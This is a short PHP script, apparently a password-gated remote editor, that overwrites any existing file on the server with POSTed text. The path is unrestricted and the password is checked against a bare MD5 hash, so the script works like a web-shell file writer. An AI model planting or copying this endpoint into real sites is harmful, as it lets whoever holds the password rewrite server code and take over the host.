<?php /*12.07.16
file_save.php?s=pass~url POST:$_POST['txt']

*/
if(!file_exists('./p.php')){exit('[X] PASS Not Exist');}
$s=explode('*',file_get_contents('./p.php'));
if(md5($_POST['p'])!=$s[1]){exit('[X] PASS');}
$s=explode('~',$_POST['s']);

if(!file_exists($s[1])){exit('[X] file_save: not exist ('.$s[1].')');}
if(is_dir($s[1])){exit('[X] file_save: is dir ('.$s[1].')');}

if(file_put_contents($s[1], $_POST['txt'])){
	echo '[V] ';
}else{
	echo '[X]';
}

echo ' file_save';
for($i=1;$i<count($s);$i++){
	echo '~'.$s[$i];
}

?>
